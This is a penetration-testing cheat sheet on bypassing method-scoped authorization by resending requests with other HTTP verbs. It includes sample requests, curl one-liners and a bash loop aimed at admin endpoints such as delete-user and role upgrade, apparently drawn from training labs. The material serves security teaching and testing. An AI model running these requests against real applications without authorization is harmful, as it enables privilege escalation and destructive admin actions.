# HTTP Method Bypass

## When this applies

- Authorization is enforced on a specific HTTP method (often POST) but missing on alternates (GET, PUT, PATCH, DELETE, HEAD, OPTIONS).
- Frameworks where annotations like `@PostMapping` only secure POST, leaving the resource accessible via other verbs.
- Method-level routing where developers wrote a custom check for the documented method.

## Technique

Switch to an alternate HTTP method to bypass authorization that is method-scoped. Body parameters move to the query string for GET; query parameters move to the body for POST.

**Vulnerable:**
```
POST /admin/delete-user   [Protected]
GET /admin/delete-user    [Vulnerable!]
PUT /admin/delete-user    [Vulnerable!]
```

## Steps

Lab — Method-Based Bypass:
```bash
# Capture POST /admin-roles
# Change to GET /admin-roles?username=wiener&action=upgrade
# Use non-admin session
```

Test all methods:
```http
# Original (blocked)
POST /admin-roles HTTP/1.1
username=target&action=upgrade

# Bypass
GET /admin-roles?username=target&action=upgrade HTTP/1.1
PUT /admin-roles HTTP/1.1
PATCH /admin-roles HTTP/1.1
```

Burp Repeater:
```
Right-click request > Change request method
POST → GET (parameters move to query string)
GET → POST (parameters move to body)
```

cURL:
```bash
# Try different methods
curl -X GET "https://target.com/admin/delete?user=carlos"
curl -X PUT "https://target.com/admin/delete?user=carlos"
curl -X PATCH "https://target.com/admin/delete?user=carlos"
curl -X DELETE "https://target.com/admin/delete?user=carlos"
```

Method testing (Bash):
```bash
#!/bin/bash

URL="https://target.com/admin-roles?username=wiener&action=upgrade"
SESSION="your-session-cookie"

methods=("GET" "POST" "PUT" "PATCH" "DELETE" "HEAD" "OPTIONS")

for method in "${methods[@]}"; do
    echo "[*] Testing $method"
    curl -X $method "$URL" \
        -H "Cookie: session=$SESSION" \
        -s -o /dev/null -w "Status: %{http_code}\n"
done
```

| Method | Use Case |
|--------|----------|
| GET | Standard retrieval |
| POST | Form submission |
| PUT | Full update |
| PATCH | Partial update |
| DELETE | Deletion |
| HEAD | Headers only |
| OPTIONS | Supported methods |

## Verifying success

- Action takes effect (user upgraded, deleted, password changed) when called via the alternate method.
- The server returns `200`/`204` instead of `403`/`405 Method Not Allowed`.
- The application's UI reflects the change.

## Common pitfalls

- `OPTIONS` may return `200` with `Allow:` header listing additional methods — useful reconnaissance.
- Some frameworks coerce HEAD to GET — same authorization but no response body.
- Some WAFs only enforce on POST — methods like PUT/PATCH skip both auth and WAF.
- Frameworks like Spring use distinct annotations per method; check that ALL handler methods carry the same `@PreAuthorize`.

## Tools

- Burp Suite Repeater (Change request method)
- curl `-X <METHOD>`
- httpie
- ffuf with `-X` for method fuzzing
